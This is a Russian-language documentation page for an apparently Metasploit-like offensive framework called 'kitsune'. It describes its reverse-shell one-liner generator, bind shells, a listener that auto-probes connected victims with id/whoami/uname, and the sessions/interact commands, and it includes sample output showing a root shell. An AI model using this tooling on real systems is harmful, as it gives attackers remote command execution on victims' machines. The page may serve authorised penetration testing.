---
title: Payloads — reverse_shell, bind_shell, listener, sessions
---

# Payloads layer

## payloads/reverse_shell

Генератор one-liner шеллов (msfvenom-lite) — python / bash / nc,
плюс base64 каждого:

```bash
kitsune > use reverse_shell
kitsune (payloads/reverse_shell) > set lhost 10.66.0.7
kitsune (payloads/reverse_shell) > run
```

Вставляет полный one-liner python/bash/nc в выдачу + loot(`payload`).
**Перед запуском жертвы**: `use payloads/listener` (см. ниже).

## payloads/bind_shell

Обратный вариант — жертва слушает, вы подключаетесь:

```bash
use bind_shell
set bport 5000
run         # python / nc -lvp / socat однострочник
# затем: nc victim-ip 5000
```

## payloads/listener (msf handler)

Обратный handler — **держит соединения открытыми**, регистрирует
сессии в db и участвует в `sessions`/`interact`:

```bash
kitsune > use listener
kitsune (payloads/listener) > set port 4444
kitsune (payloads/listener) > set seconds 60
kitsune (payloads/listener) > set autoprobe yes    # id/whoami/uname → loot
kitsune (payloads/listener) > run                  # блокирует REPL на N секунд
```

Когда shell подключается:
```
[+] shell connected from 10.0.0.5 — session live
[+] auto-probe 10.0.0.5: id=uid=0(root)...; whoami=root; ...
```

## sessions / interact

```
kitsune > sessions
  Idx  Host      Port  State
     0 127.0.0.1 4444  LIVE
kitsune > interact 0
kitsune (shell) > id
kitsune (shell) > uname -a
kitsune (shell) > exit     # вернуться в REPL; сессия остаётся жива
```

Промпт `kitsune (shell) >` читает ввод из REPL, отсылает через
TCP, ждёт ответ (timeout 1.5 сек). `sessions` одновременно показывает
историю из `db.sessions` (статусы open/closed).

Дальше: [post](07-post.md)
